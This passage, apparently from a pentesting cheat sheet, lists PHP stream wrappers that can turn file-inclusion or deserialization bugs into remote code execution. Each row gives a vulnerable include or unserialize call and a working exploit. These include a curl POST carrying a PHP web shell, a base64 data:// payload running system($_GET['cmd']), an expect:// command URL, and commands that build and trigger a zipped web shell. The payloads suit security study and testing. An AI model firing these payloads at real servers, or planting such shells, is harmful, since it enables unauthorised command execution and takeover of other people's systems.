**1. PHP Wrappers Leading to RCE**

PHP wrappers are stream wrappers that provide access to various protocols and encapsulate operations on them. Misuse or improper validation when using these wrappers can lead to security vulnerabilities, including RCE.


|**Wrapper**|**Description**|**Exploitation Example**|
|---|---|---|
|**`php://input`**|Accesses raw POST data.|**Vulnerable Code:**`include('php://input');`**Exploit:**`curl -X POST --data '<?php system($_GET["cmd"]); ?>' "http://target.com/vulnerable.php?cmd=id"`|
|**`data://`**|Embeds base64-encoded data in PHP.|**Vulnerable Code:**`include($_GET['page']);`**Exploit:**`http://target.com/vulnerable.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id`|
|**`expect://`**|Executes system commands via process interaction.|**Vulnerable Code:**`include($_GET['page']);`**Exploit:**`http://target.com/vulnerable.php?page=expect://id`|
|**`zip://`**|Reads files inside ZIP archives.|**Vulnerable Code:**`include($_GET['file']);`**Exploit:**Create a ZIP containing a PHP shell:`echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.zip shell.php`Trigger RCE:`http://target.com/vulnerable.php?file=zip://shell.zip%23shell.php&cmd=id`|
|**`phar://`**|Exploits PHAR deserialization for RCE.|**Vulnerable Code:**`$data = unserialize(file_get_contents('phar://'.$_GET['file']));`**Exploit:**Create a malicious PHAR:`php -d 'phar.readonly=0' create_phar.php`Trigger RCE:`http://target.com/vulnerable.php?file=malicious.phar`|


